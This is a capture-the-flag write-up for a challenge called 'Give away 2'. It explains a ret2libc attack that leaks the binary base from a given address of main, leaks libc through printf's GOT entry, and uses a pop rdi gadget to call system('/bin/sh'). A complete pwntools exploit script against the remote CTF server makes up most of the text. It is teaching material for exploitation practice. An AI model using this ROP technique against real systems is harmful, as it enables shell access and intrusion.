# Give away 2

We again get their libc version. It gives us a leak, but this time it begins with `0x56`, so likely something in the binary. If we step through in a debugger again, we find the  program actually gives us the address of main. This lets us calculate the binary base.

We're going to need to use the libc somehow, so we can use the PLT and the GOT to leak a libc address.

Because the GOT is inside of the binary itself and is a table of libc addresses, if we can read the GOT we can read a libc address.

Meanwhile, the PLT is also inside of the binary. The PLT has a bunch of stubs, allowing us to call a libc function without it's address.

printf is called before we input. So it's GOT entry will contain it's libc address.

Thus, we can call printf on printf in got to leak printf's address, subtract appropriately to get the libc base, and then do what we did last time. in 64-bit, arguments are in rdi, then rsi, then rdx, etc. We need a pop rdi gadget in order to call `system("/bin/sh")`. The gadget would essentially be a piece of code within the binary that does `"pop rdi ; ret"`, popping the next value off the stack into rdi and then returning to the next return address.

So our exploit must:
* Use address of main to get binary base and address of gadgets and GOT and PLT
* call printf on printf in got to leak it's address (and call vuln afterwards so we get another input)
* Use this to calculate libc base and address of other things we want
* On second input, do `padding + pop rdi + address of /bin/sh + address of system`
```python
from pwn import *
import re
NUM_TO_RET = 0x20 + 8
padding = b'A' * NUM_TO_RET
poprdi = 0x0000000000000903 # pop rdi ; ret
e = ELF("./give2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if sys.argv[1] == "local" else "libc-2.27.so")
p = e.process() if sys.argv[1] == "local" else remote('sharkyctf.xyz', 20335)
output = p.recvline().decode()
main = int(re.findall("Give away: (.*)", output)[0], 16)
base = main - e.symbols['main']
e.address = base
log.info(f"Main: {hex(main)}")
log.info(f"Binary base: {hex(e.address)}")
poprdi += base
leak = flat(padding, poprdi, e.got['printf'], e.plt['printf'], e.symbols['vuln'], word_size=64)
pause()
#p.sendline(padding + p64(main))
p.sendline(padding + p64(e.symbols['vuln']))
#p.recvline()
p.sendline(leak)
#output = p.recvuntil("G")[:-1]
output = p.recv()
#p.recvline()
output += b'\x00' * (8 - len(output))
printf = u64(output)
libcbase = printf - libc.symbols['printf']
log.info(f"Printf: {hex(printf)}")
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
payload = flat(padding, poprdi, next(libc.search(b"/bin/sh\x00")), libc.symbols['system'], word_size=64)
p.sendline(payload)
p.interactive()
```
